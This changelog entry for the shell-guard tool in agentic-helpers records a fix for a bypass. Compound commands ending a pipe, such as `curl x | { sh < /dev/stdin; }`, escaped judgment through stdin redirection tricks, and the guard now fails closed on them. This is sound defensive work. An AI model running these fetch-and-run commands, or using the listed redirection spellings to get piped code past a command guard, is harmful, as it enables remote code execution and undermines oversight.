Shell-guard keeps refusing a shell inside a compound command at the end of a pipe when its input redirection may still be the pipe, in agentic-helpers commit 4d2b759, not yet released, tightening the compound-pipe handling of 20261031-163018-s-tac-ptl. That handling skipped any statement redirecting descriptor 0, so `curl x | { sh < /dev/stdin; }`, `{ sh 0<&0; }` and `{ sh < "$f"; }` ran unjudged. `internal/shellwalk` now counts the pipe as replaced only when the statement's last redirection of descriptor 0 is a here-document, a here-string (whose code the walk judges itself) or a file named by fixed text that is not standard input under any cleaned spelling (`/dev/stdin`, `/dev/fd/N`, `/proc/<pid>/fd/N`). A duplicated descriptor or a target built at run time is read as possibly the pipe, so the guard fails closed. Each new check, deliberately broken in turn, made its own test fail, and restored, passes; `docs/shell-guard/architecture.md` states the rule.
